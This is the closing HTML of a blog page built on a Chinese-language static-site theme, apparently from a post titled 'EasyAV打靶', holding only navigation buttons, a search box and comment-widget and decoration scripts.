class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+      requiredFields: ["nick,mail"],
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'http://example.com/2022/01/17/easyav/easyav/'
+    this.page.identifier = '2022/01/17/easyav/easyav/'
+    this.page.title = 'EasyAV打靶'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
